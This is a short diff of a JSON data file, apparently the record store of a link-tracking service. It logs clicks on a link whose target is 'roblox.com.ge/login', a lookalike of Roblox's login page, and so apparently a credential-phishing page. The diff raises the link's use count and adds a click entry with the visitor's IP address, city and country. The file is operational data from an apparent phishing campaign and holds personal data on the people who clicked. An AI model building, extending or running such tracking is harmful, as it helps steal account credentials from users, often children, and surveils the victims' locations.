@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1174,
+    "useCount": 1175,
     "createdBy": "admin",
     "clicks": [
       {
@@ -9534,6 +9534,14 @@
         "ip": "197.184.176.202",
         "country": "South Africa",
         "city": "Johannesburg",
+        "flag": "🇿🇦",
+        "countryCode": "ZA"
+      },
+      {
+        "timestamp": 1777293640016,
+        "ip": "41.56.141.205",
+        "country": "South Africa",
+        "city": "Cape Town",
         "flag": "🇿🇦",
         "countryCode": "ZA"
       }
